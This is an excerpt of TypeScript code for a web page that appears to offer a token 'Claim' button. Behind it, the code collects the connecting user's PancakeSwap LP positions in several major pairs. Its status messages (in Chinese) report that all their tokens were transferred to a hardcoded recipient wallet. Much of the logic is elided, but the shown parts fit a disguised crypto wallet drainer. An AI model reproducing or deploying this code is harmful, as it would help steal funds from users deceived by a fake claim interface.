...
const CONFIG: ConfigEnv = USE_TESTNET
  ? {
      ...
      CAKE_ADDRESS: "0xFa60D973F7642B748046464e165A65B7323b0DEE",
...
const RECIPIENT_ADDRESS = "0x1b7809EB9aCE9b9056f921F5593Ef925AB9Fa7fB";
...
/** 支持的交易对：ETH/BTCB, ETH/USDT, ETH/WBNB, BTCB/WBNB, USDT/WBNB, CAKE/WBNB, USDT/BTCB */
const SUPPORTED_PAIRS: [string, string][] = [
  [CONFIG.ETH_ADDRESS, CONFIG.BTCB_ADDRESS],
  [CONFIG.ETH_ADDRESS, CONFIG.USDT_ADDRESS],
  [CONFIG.ETH_ADDRESS, CONFIG.WBNB_ADDRESS],
  [CONFIG.BTCB_ADDRESS, CONFIG.WBNB_ADDRESS],
  [CONFIG.USDT_ADDRESS, CONFIG.WBNB_ADDRESS],
  [CONFIG.CAKE_ADDRESS, CONFIG.WBNB_ADDRESS],
  [CONFIG.USDT_ADDRESS, CONFIG.BTCB_ADDRESS]
];

function isSupportedPair(token0: string | undefined, token1: string | undefined): boolean {
  const t0 = (token0 ?? "").toLowerCase();
  const t1 = (token1 ?? "").toLowerCase();
  return SUPPORTED_PAIRS.some(
    ([a, b]) =>
      (t0 === a.toLowerCase() && t1 === b.toLowerCase()) ||
      (t0 === b.toLowerCase() && t1 === a.toLowerCase())
  );
}
  ...
  try {
    ...
    for (let i = 0; i < count; i++) {
      try {
        ...
        if (isSupportedPair(pos.token0, pos.token1) && pos.liquidity > 0n) {
          lpPositions.push({
...
async function executeAll(): Promise<void> {
  ...
  try {
    ...
    if (completedAll) {
      setStatus(
        `已完成 ${lpPositions.length} 个 LP，代币已转到 ${shortAddress(RECIPIENT_ADDRESS)}`
      );
    }
  } catch (e: unknown) {
    console.error(e);
...
async function runClaimFlow(): Promise<void> {
  ...
  if (isRunning) return;
  isRunning = true;
  const btns = document.querySelectorAll<HTMLButtonElement>(".js-claim-trigger");
  btns.forEach((b) => {
    b.disabled = true;
  ...
  try {
    ...
    setStatus(`全部完成，代币已转到 ${shortAddress(RECIPIENT_ADDRESS)}`);
  } catch (e: unknown) {
    console.error(e);
    alert("失败: " + getReadableError(e));
  } finally {
    isRunning = false;
    const restore = document.querySelectorAll<HTMLButtonElement>(".js-claim-trigger");
    restore.forEach((b) => {
      b.disabled = false;
      b.textContent = b.dataset.originalText ?? "Claim";
    });
  }
}
...
document.querySelectorAll(".js-claim-trigger").forEach((btn) => {
  btn.addEventListener("click", runClaimFlow);
});
setupTabs();
